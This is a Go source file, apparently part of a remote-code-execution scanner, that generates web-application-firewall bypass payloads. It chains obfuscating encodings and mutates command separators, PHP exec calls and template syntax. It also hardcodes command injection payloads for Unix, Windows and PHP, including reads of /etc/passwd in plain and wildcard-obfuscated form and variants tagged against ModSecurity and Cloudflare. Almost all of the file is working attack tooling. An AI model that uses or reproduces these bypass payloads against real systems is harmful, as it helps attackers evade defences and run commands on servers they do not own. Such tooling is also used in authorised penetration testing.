package wafbypass

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/hbzw/RCE_HawkEye_go/internal/types"
)

type WAFBypassGenerator struct {
	mutationRules  map[string][]func(string) []string
	encodingChains [][]types.WAFTechnique
}

func NewWAFBypassGenerator() *WAFBypassGenerator {
	g := &WAFBypassGenerator{}
	g.initMutationRules()
	g.initEncodingChains()
	return g
}

func (g *WAFBypassGenerator) initMutationRules() {
	g.mutationRules = map[string][]func(string) []string{
		"command_injection": {
			g.mutateCommandSeparators,
			g.mutateCommandSubstitution,
			g.mutatePipeOperators,
			g.mutateRedirection,
		},
		"php_injection": {
			g.mutatePHPFunctions,
			g.mutatePHPVariables,
			g.mutatePHPStrings,
		},
		"template_injection": {
			g.mutateTemplateSyntax,
		},
	}
}

func (g *WAFBypassGenerator) initEncodingChains() {
	g.encodingChains = [][]types.WAFTechnique{
		{types.WAFTechniqueURLEncoding},
		{types.WAFTechniqueDoubleURLEncoding},
		{types.WAFTechniqueBase64Encoding},
		{types.WAFTechniqueUnicodeEncoding},
		{types.WAFTechniqueURLEncoding, types.WAFTechniqueCaseManipulation},
		{types.WAFTechniqueCommentObfuscation, types.WAFTechniqueURLEncoding},
		{types.WAFTechniqueNullByte, types.WAFTechniqueURLEncoding},
		{types.WAFTechniqueHexEncoding},
		{types.WAFTechniqueOctalEncoding},
		{types.WAFTechniqueHTMLEntity},
		{types.WAFTechniqueWhitespaceVariation},
		{types.WAFTechniqueQuoteManipulation},
	}
}

func (g *WAFBypassGenerator) URLEncode(payload string, double bool) string {
	if double {
		return url.QueryEscape(url.QueryEscape(payload))
	}
	return url.QueryEscape(payload)
}

func (g *WAFBypassGenerator) Base64Encode(payload string) string {
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

func (g *WAFBypassGenerator) UnicodeEncode(payload string) string {
	var result strings.Builder
	for _, char := range payload {
		if char < 128 && (char >= 'a' && char <= 'z' || char >= 'A' && char <= 'Z' || char >= '0' && char <= '9') {
			result.WriteRune(char)
		} else {
			result.WriteString(fmt.Sprintf("\\u%04x", char))
		}
	}
	return result.String()
}

func (g *WAFBypassGenerator) HexEncode(payload string) string {
	var result strings.Builder
	for _, char := range payload {
		result.WriteString(fmt.Sprintf("\\x%02x", char))
	}
	return result.String()
}

func (g *WAFBypassGenerator) OctalEncode(payload string) string {
	var result strings.Builder
	for _, char := range payload {
		result.WriteString(fmt.Sprintf("\\%03o", char))
	}
	return result.String()
}

func (g *WAFBypassGenerator) HTMLEntityEncode(payload string) string {
	var result strings.Builder
	for _, char := range payload {
		if char >= 'a' && char <= 'z' || char >= 'A' && char <= 'Z' || char >= '0' && char <= '9' {
			result.WriteRune(char)
		} else {
			result.WriteString(fmt.Sprintf("&#x%x;", char))
		}
	}
	return result.String()
}

func (g *WAFBypassGenerator) InsertComments(payload string, commentStyle string) string {
	rand.Seed(time.Now().UnixNano())
	var comment string

	switch commentStyle {
	case "c":
		randomStr := make([]byte, rand.Intn(6)+3)
		for i := range randomStr {
			randomStr[i] = byte('a' + rand.Intn(26))
		}
		comment = fmt.Sprintf("/*%s*/", string(randomStr))
	case "sql":
		comment = "/**/"
	case "html":
		randomStr := make([]byte, rand.Intn(3)+3)
		for i := range randomStr {
			randomStr[i] = byte('a' + rand.Intn(26))
		}
		comment = fmt.Sprintf("<!--%s-->", string(randomStr))
	default:
		comment = "/**/"
	}

	var result strings.Builder
	for i, char := range payload {
		result.WriteRune(char)
		if rand.Float64() < 0.3 && char != ' ' && char != '\n' && char != '\t' {
			result.WriteString(comment)
		}
		_ = i
	}
	return result.String()
}

func (g *WAFBypassGenerator) CaseManipulation(payload string) string {
	rand.Seed(time.Now().UnixNano())
	var result strings.Builder
	for _, char := range payload {
		if char >= 'a' && char <= 'z' || char >= 'A' && char <= 'Z' {
			if rand.Float64() < 0.5 {
				result.WriteRune(char - 32)
			} else {
				result.WriteRune(char)
			}
		} else {
			result.WriteRune(char)
		}
	}
	return result.String()
}

func (g *WAFBypassGenerator) InsertNullBytes(payload string) string {
	var result strings.Builder
	for _, char := range payload {
		if rand.Float64() < 0.2 {
			result.WriteString("%00")
		}
		result.WriteRune(char)
	}
	return result.String()
}

func (g *WAFBypassGenerator) WhitespaceVariation(payload string) string {
	whitespaceChars := []string{" ", "\t", "\n", "\r", "\v", "\f", "%09", "%0a", "%0d", "%20"}
	var result strings.Builder
	for _, char := range payload {
		if char == ' ' {
			result.WriteString(whitespaceChars[rand.Intn(len(whitespaceChars))])
		} else {
			result.WriteRune(char)
		}
	}
	return result.String()
}

func (g *WAFBypassGenerator) QuoteManipulation(payload string) string {
	quoteChars := []string{"'", "\"", "`", "'", "\"", "´", "ʹ", "ʺ"}
	var result strings.Builder
	for _, char := range payload {
		if char == '\'' || char == '"' {
			result.WriteString(quoteChars[rand.Intn(len(quoteChars))])
		} else {
			result.WriteRune(char)
		}
	}
	return result.String()
}

func (g *WAFBypassGenerator) mutateCommandSeparators(payload string) []string {
	separators := []string{";", "|", "||", "&&", "&", "\n", "\r\n", "%0a", "%0d%0a"}
	var results []string

	for _, sep := range separators {
		mutated := regexp.MustCompile(`[;&|]`).ReplaceAllString(payload, sep)
		if mutated != payload {
			results = append(results, mutated)
		}
	}
	return results
}

func (g *WAFBypassGenerator) mutateCommandSubstitution(payload string) []string {
	var results []string

	if strings.Contains(payload, "$(") || strings.Contains(payload, "`") {
		if strings.Contains(payload, "$(") {
			mutated := strings.ReplaceAll(payload, "$(", "`")
			mutated = strings.ReplaceAll(mutated, ")", "`")
			results = append(results, mutated)
		}
		if strings.Contains(payload, "`") {
			mutated := strings.ReplaceAll(payload, "`", "$(")
			mutated = strings.ReplaceAll(mutated, "`", ")")
			results = append(results, mutated)
		}
	}
	return results
}

func (g *WAFBypassGenerator) mutatePipeOperators(payload string) []string {
	var results []string
	pipeVariants := []string{"|", "||", "%7c", "%7c%7c"}

	for _, variant := range pipeVariants {
		if strings.Contains(payload, "|") {
			results = append(results, strings.ReplaceAll(payload, "|", variant))
		}
	}
	return results
}

func (g *WAFBypassGenerator) mutateRedirection(payload string) []string {
	var results []string
	redirectPatterns := []struct {
		original    string
		replacement string
	}{
		{">", "%3e"},
		{">>", "%3e%3e"},
		{"<", "%3c"},
		{"2>", "%32%3e"},
		{"&>", "%26%3e"},
	}

	for _, p := range redirectPatterns {
		if strings.Contains(payload, p.original) {
			results = append(results, strings.ReplaceAll(payload, p.original, p.replacement))
		}
	}
	return results
}

func (g *WAFBypassGenerator) mutatePHPFunctions(payload string) []string {
	var results []string
	phpFunctions := []string{"system", "exec", "shell_exec", "passthru", "popen", "proc_open"}

	for _, funcName := range phpFunctions {
		re := regexp.MustCompile("(?i)" + funcName)
		if re.MatchString(payload) {
			caseVariants := []string{
				strings.ToUpper(funcName),
				strings.Title(funcName),
			}
			for _, variant := range caseVariants {
				results = append(results, re.ReplaceAllString(payload, variant))
			}

			commentVariant := string(funcName[0]) + "/**/" + funcName[1:]
			results = append(results, re.ReplaceAllString(payload, commentVariant))
		}
	}
	return results
}

func (g *WAFBypassGenerator) mutatePHPVariables(payload string) []string {
	var results []string

	if strings.Contains(payload, "$") {
		results = append(results, strings.ReplaceAll(payload, "$", "${"))
		results = append(results, strings.ReplaceAll(payload, "$", "$$"))
	}

	return results
}

func (g *WAFBypassGenerator) mutatePHPStrings(payload string) []string {
	var results []string

	if strings.Contains(payload, "'") {
		results = append(results, strings.ReplaceAll(payload, "'", "\""))
	}
	if strings.Contains(payload, "\"") {
		results = append(results, strings.ReplaceAll(payload, "\"", "'"))
	}

	if strings.Contains(payload, "'") || strings.Contains(payload, "\"") {
		results = append(results, g.InsertComments(payload, "c"))
	}

	return results
}

func (g *WAFBypassGenerator) mutateTemplateSyntax(payload string) []string {
	var results []string

	if strings.Contains(payload, "{{") {
		results = append(results, strings.ReplaceAll(payload, "{{", "${"))
		results = append(results, strings.ReplaceAll(payload, "{{", "#{"))
		results = append(results, strings.ReplaceAll(payload, "{{", "<%"))
	}

	if strings.Contains(payload, "${") {
		results = append(results, strings.ReplaceAll(payload, "${", "{{"))
		results = append(results, strings.ReplaceAll(payload, "${", "#{"))
	}

	return results
}

func (g *WAFBypassGenerator) GenerateBypassPayloads(originalPayload string, maxVariants int) []types.BypassPayload {
	var variants []types.BypassPayload
	seen := map[string]bool{originalPayload: true}

	for _, chain := range g.encodingChains {
		payload := originalPayload
		for _, technique := range chain {
			payload = g.applyTechnique(payload, technique)
		}

		if !seen[payload] {
			seen[payload] = true
			variants = append(variants, types.BypassPayload{
				Original:   originalPayload,
				Payload:    payload,
				Technique:  chain[0],
				Description: fmt.Sprintf("编码链: %v", chain),
				TargetWAF:  []string{"generic"},
			})
		}
	}

	for _, rules := range g.mutationRules {
		for _, rule := range rules {
			mutatedList := rule(originalPayload)
			for _, mutated := range mutatedList {
				if !seen[mutated] && len(variants) < maxVariants {
					seen[mutated] = true
					variants = append(variants, types.BypassPayload{
						Original:   originalPayload,
						Payload:    mutated,
						Technique:  types.WAFTechniqueCommentObfuscation,
						Description: "变异规则",
						TargetWAF:  []string{"generic"},
					})
				}
			}
		}
	}

	if len(variants) > maxVariants {
		variants = variants[:maxVariants]
	}

	return variants
}

func (g *WAFBypassGenerator) applyTechnique(payload string, technique types.WAFTechnique) string {
	switch technique {
	case types.WAFTechniqueURLEncoding:
		return g.URLEncode(payload, false)
	case types.WAFTechniqueDoubleURLEncoding:
		return g.URLEncode(payload, true)
	case types.WAFTechniqueBase64Encoding:
		return g.Base64Encode(payload)
	case types.WAFTechniqueUnicodeEncoding:
		return g.UnicodeEncode(payload)
	case types.WAFTechniqueHexEncoding:
		return g.HexEncode(payload)
	case types.WAFTechniqueOctalEncoding:
		return g.OctalEncode(payload)
	case types.WAFTechniqueHTMLEntity:
		return g.HTMLEntityEncode(payload)
	case types.WAFTechniqueCommentObfuscation:
		return g.InsertComments(payload, "c")
	case types.WAFTechniqueCaseManipulation:
		return g.CaseManipulation(payload)
	case types.WAFTechniqueNullByte:
		return g.InsertNullBytes(payload)
	case types.WAFTechniqueWhitespaceVariation:
		return g.WhitespaceVariation(payload)
	case types.WAFTechniqueQuoteManipulation:
		return g.QuoteManipulation(payload)
	default:
		return payload
	}
}

func (g *WAFBypassGenerator) GenerateUnixBypassPayloads() []types.BypassPayload {
	basePayloads := []string{
		"; ls;",
		"; whoami;",
		"; id;",
		"| ls",
		"| whoami",
		"`ls`",
		"$(ls)",
		"; cat /etc/passwd;",
	}

	var allVariants []types.BypassPayload
	for _, payload := range basePayloads {
		variants := g.GenerateBypassPayloads(payload, 10)
		allVariants = append(allVariants, variants...)
	}

	specialBypasses := []types.BypassPayload{
		{Original: "; ls;", Payload: ";{ls,};", Technique: types.WAFTechniquePathObfuscation, Description: "大括号扩展绕过", TargetWAF: []string{"modsecurity", "generic"}},
		{Original: "; ls;", Payload: "; l''s;", Technique: types.WAFTechniqueQuoteManipulation, Description: "引号分割绕过", TargetWAF: []string{"cloudflare", "generic"}},
		{Original: "; ls;", Payload: "; l\\s;", Technique: types.WAFTechniquePathObfuscation, Description: "反斜杠转义绕过", TargetWAF: []string{"generic"}},
		{Original: "; ls;", Payload: "; l$@s;", Technique: types.WAFTechniqueVariableSubstitution, Description: "特殊变量绕过", TargetWAF: []string{"modsecurity", "generic"}},
		{Original: "; ls;", Payload: "; l${PATH:0:0}s;", Technique: types.WAFTechniqueVariableSubstitution, Description: "变量切片绕过", TargetWAF: []string{"generic"}},
		{Original: "; ls;", Payload: "; l${IFS}s;", Technique: types.WAFTechniqueVariableSubstitution, Description: "IFS变量绕过", TargetWAF: []string{"generic"}},
		{Original: "; ls;", Payload: "%0als", Technique: types.WAFTechniqueURLEncoding, Description: "换行符URL编码绕过", TargetWAF: []string{"generic"}},
		{Original: "; cat /etc/passwd;", Payload: "; /???/??t /???/p??s??;", Technique: types.WAFTechniquePathObfuscation, Description: "通配符绕过", TargetWAF: []string{"modsecurity", "cloudflare", "generic"}},
	}

	allVariants = append(allVariants, specialBypasses...)
	return allVariants
}

func (g *WAFBypassGenerator) GenerateWindowsBypassPayloads() []types.BypassPayload {
	basePayloads := []string{
		"& dir",
		"& whoami",
		"| dir",
		"| whoami",
	}

	var allVariants []types.BypassPayload
	for _, payload := range basePayloads {
		variants := g.GenerateBypassPayloads(payload, 10)
		allVariants = append(allVariants, variants...)
	}

	specialBypasses := []types.BypassPayload{
		{Original: "& dir", Payload: "& d^ir", Technique: types.WAFTechniquePathObfuscation, Description: "Windows脱字符绕过", TargetWAF: []string{"generic"}},
		{Original: "& whoami", Payload: "& w^hoami", Technique: types.WAFTechniquePathObfuscation, Description: "whoami脱字符绕过", TargetWAF: []string{"generic"}},
		{Original: "& dir", Payload: "& di''r", Technique: types.WAFTechniqueQuoteManipulation, Description: "Windows引号绕过", TargetWAF: []string{"generic"}},
		{Original: "& dir", Payload: "& set /a=dir&call %a%", Technique: types.WAFTechniqueVariableSubstitution, Description: "变量调用绕过", TargetWAF: []string{"generic"}},
		{Original: "& dir", Payload: "& %COMSPEC% /c dir", Technique: types.WAFTechniqueVariableSubstitution, Description: "COMSPEC变量绕过", TargetWAF: []string{"generic"}},
	}

	allVariants = append(allVariants, specialBypasses...)
	return allVariants
}

func (g *WAFBypassGenerator) GeneratePHPBypassPayloads() []types.BypassPayload {
	basePayloads := []string{
		"system('ls');",
		"exec('ls');",
		"shell_exec('ls');",
		"passthru('ls');",
	}

	var allVariants []types.BypassPayload
	for _, payload := range basePayloads {
		variants := g.GenerateBypassPayloads(payload, 10)
		allVariants = append(allVariants, variants...)
	}

	specialBypasses := []types.BypassPayload{
		{Original: "system('ls');", Payload: "sYsTeM('ls');", Technique: types.WAFTechniqueCaseManipulation, Description: "PHP函数大小写绕过", TargetWAF: []string{"generic"}},
		{Original: "system('ls');", Payload: "sys/**/tem('ls');", Technique: types.WAFTechniqueCommentObfuscation, Description: "PHP注释分割绕过", TargetWAF: []string{"modsecurity", "generic"}},
		{Original: "system('ls');", Payload: "(system)('ls');", Technique: types.WAFTechniquePathObfuscation, Description: "PHP括号绕过", TargetWAF: []string{"generic"}},
		{Original: "system('ls');", Payload: "call_user_func('system','ls');", Technique: types.WAFTechniqueVariableSubstitution, Description: "PHP回调函数绕过", TargetWAF: []string{"generic"}},
		{Original: "system('ls');", Payload: "array_map('system',array('ls'));", Technique: types.WAFTechniqueVariableSubstitution, Description: "PHP array_map绕过", TargetWAF: []string{"generic"}},
		{Original: "system('ls');", Payload: "var_dump(`ls`);", Technique: types.WAFTechniqueVariableSubstitution, Description: "PHP反引号执行绕过", TargetWAF: []string{"generic"}},
	}

	allVariants = append(allVariants, specialBypasses...)
	return allVariants
}

func (g *WAFBypassGenerator) GetAllBypassPayloads() []types.BypassPayload {
	var allPayloads []types.BypassPayload
	allPayloads = append(allPayloads, g.GenerateUnixBypassPayloads()...)
	allPayloads = append(allPayloads, g.GenerateWindowsBypassPayloads()...)
	allPayloads = append(allPayloads, g.GeneratePHPBypassPayloads()...)
	return allPayloads
}
